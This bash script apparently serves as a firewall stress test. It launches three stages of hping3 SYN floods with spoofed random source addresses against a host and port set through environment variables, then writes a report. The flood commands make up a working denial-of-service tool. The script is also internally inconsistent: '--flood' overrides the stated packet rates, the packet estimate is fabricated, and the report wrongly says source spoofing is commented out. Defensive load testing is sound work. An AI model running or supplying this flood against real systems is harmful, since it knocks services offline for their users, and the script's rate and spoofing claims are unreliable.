#!/usr/bin/env bash
set -euo pipefail

SYN_FLOOD_SCRIPT="${0##*/}"
TARGET_HOST="${AEGIS_TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${AEGIS_TARGET_PORT:-8443}"
INTERFACE="${AEGIS_INTERFACE:-lo}"
DURATION="${AEGIS_DURATION:-30}"
PACKET_RATE="${AEGIS_PACKET_RATE:-500}"
REPORT_FILE="syn_flood_report_$(date +%Y%m%d_%H%M%S).txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_info()  { echo -e "${GREEN}[INFO]${NC}  $*"; }
log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
log_error() { echo -e "${RED}[ERROR]${NC} $*"; }

cleanup() {
    log_info "Cleaning up..."
    if [[ -n "${HPING_PID:-}" ]]; then
        kill "$HPING_PID" 2>/dev/null || true
        wait "$HPING_PID" 2>/dev/null || true
    fi
    log_info "Cleanup complete."
}
trap cleanup EXIT INT TERM

check_command() {
    if ! command -v "$1" &>/dev/null; then
        log_error "Required command '$1' not found. Please install it."
        log_info "Debian/Ubuntu: apt-get install $1"
        log_info "RHEL/Fedora: dnf install $1"
        exit 1
    fi
}

run_report() {
    local stage="$1"
    local start_time="$2"
    local end_time="$3"
    local packets_sent="$4"
    local exit_code="$5"

    {
        echo "=========================================="
        echo " Aegis WAF SYN Flood Test Report"
        echo "=========================================="
        echo " Generated: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
        echo ""
        echo " Test Configuration"
        echo "-------------------"
        echo " Target Host:     $TARGET_HOST:$TARGET_PORT"
        echo " Interface:       $INTERFACE"
        echo " Duration:        ${DURATION}s"
        echo " Rate:            $PACKET_RATE pps"
        echo " Stage:           $stage"
        echo ""
        echo " Test Results"
        echo "------------"
        echo " Start Time:      $start_time"
        echo " End Time:        $end_time"
        echo " Packets Sent:    $packets_sent"
        echo " Exit Code:       $exit_code"
        echo " Result:          $([ "$exit_code" -eq 0 ] && echo "COMPLETED" || echo "INTERRUPTED")"
        echo ""
        echo " Defense Indicators (manual verification recommended)"
        echo "---------------------"
        echo " 1. Check Aegis logs: the ingress filter should log SYN flood detections"
        echo " 2. Check if target host still responds to legitimate requests"
        echo " 3. Verify that Aegis blocked or challenged the attacking IP"
        echo " 4. Run: curl -k https://$TARGET_HOST:$TARGET_PORT/health"
        echo ""
        echo " Notes"
        echo "------"
        echo " - This test requires root privileges for raw socket access"
        echo " - Use --rand-source flag (commented in script) for distributed simulation"
        echo "=========================================="
    } > "$REPORT_FILE"

    log_info "Report saved to $REPORT_FILE"
}

main() {
    log_info "=== Aegis WAF SYN Flood Attack Simulation ==="
    log_info "Target: $TARGET_HOST:$TARGET_PORT"
    log_info "Duration: ${DURATION}s | Rate: $PACKET_RATE pps"
    log_info "==============================================="

    check_command hping3

    if [[ $EUID -ne 0 ]]; then
        log_error "This script requires root privileges for raw socket operations."
        log_info "Please run: sudo $0"
        exit 1
    fi

    START_TIME=$(date -u '+%Y-%m-%d %H:%M:%S')
    START_EPOCH=$(date +%s)

    log_info "Stage 1: Low-rate SYN flood (100 pps) for $((DURATION / 3)) seconds"
    hping3 -S -p "$TARGET_PORT" --flood --rand-source \
        -i "u$((1_000_000 / 100))" "$TARGET_HOST" \
        2>/dev/null &
    HPING_PID=$!
    sleep $((DURATION / 3))
    kill "$HPING_PID" 2>/dev/null || true
    wait "$HPING_PID" 2>/dev/null || true
    HPING_PID=""
    log_info "Stage 1 complete."

    log_info "Stage 2: Medium-rate SYN flood ($((PACKET_RATE / 2)) pps) for $((DURATION / 3)) seconds"
    hping3 -S -p "$TARGET_PORT" --flood --rand-source \
        -i "u$((1_000_000 / (PACKET_RATE / 2)))" "$TARGET_HOST" \
        2>/dev/null &
    HPING_PID=$!
    sleep $((DURATION / 3))
    kill "$HPING_PID" 2>/dev/null || true
    wait "$HPING_PID" 2>/dev/null || true
    HPING_PID=""
    log_info "Stage 2 complete."

    log_info "Stage 3: High-rate SYN flood ($PACKET_RATE pps) for $((DURATION / 3)) seconds"
    hping3 -S -p "$TARGET_PORT" --flood --rand-source \
        -i "u$((1_000_000 / PACKET_RATE))" "$TARGET_HOST" \
        2>/dev/null &
    HPING_PID=$!
    sleep $((DURATION / 3))
    kill "$HPING_PID" 2>/dev/null || true
    wait "$HPING_PID" 2>/dev/null || true
    HPING_PID=""
    log_info "Stage 3 complete."

    END_TIME=$(date -u '+%Y-%m-%d %H:%M:%S')
    END_EPOCH=$(date +%s)
    ELAPSED=$((END_EPOCH - START_EPOCH))

    ESTIMATED_PACKETS=$(( (DURATION / 3) * 100 + (DURATION / 3) * (PACKET_RATE / 2) + (DURATION / 3) * PACKET_RATE ))

    log_info "=== SYN Flood Test Complete ==="
    log_info "Elapsed: ${ELAPSED}s | Estimated Packets: $ESTIMATED_PACKETS"

    run_report "multi-stage" "$START_TIME" "$END_TIME" "$ESTIMATED_PACKETS" 0
}

main "$@"
